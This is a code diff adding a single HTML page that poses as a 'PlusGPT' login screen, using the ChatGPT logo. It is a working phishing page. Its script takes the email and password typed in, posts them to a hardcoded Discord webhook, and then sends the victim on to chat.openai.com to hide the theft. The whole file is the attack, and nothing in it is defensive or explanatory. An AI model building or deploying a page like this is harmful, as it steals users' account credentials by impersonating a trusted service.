@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PlusGPT</title>
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/ChatGPT_logo.svg/2048px-ChatGPT_logo.svg.png">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .login-container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            max-width: 320px;
+            width: 100%;
+            text-align: center;
+        }
+        h2 {
+            margin-bottom: 20px;
+        }
+        input[type="email"], input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            margin-top: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login form</h2>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email..." required>
+            <input type="password" id="password" placeholder="Password..." required>
+            <button type="submit" onclick="redirect()">Send</button>
+        </form>
+    </div>
+
+    <script>
+        function redirect() {
+            window.location.href = "https://chat.openai.com/";
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const webhookURL = 'https://discord.com/api/webhooks/1240294055427178516/S84oWKYfs6D8vjialTpBih_0J50DCbNZCy4ppC_IUc2LE5h8dhRKi7fYfGtzbXW-Xpoi';
+
+            const payload = {
+                content: `**Email: ${email}\nPassword: ${password}**`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Data send correctly');
+                } else {
+                    alert('Error in data sending');
+                }
+            })
+            .catch(error => {
+                alert('Error: ' + error);
+            });
+        });
+    </script>
+</body>
+</html>
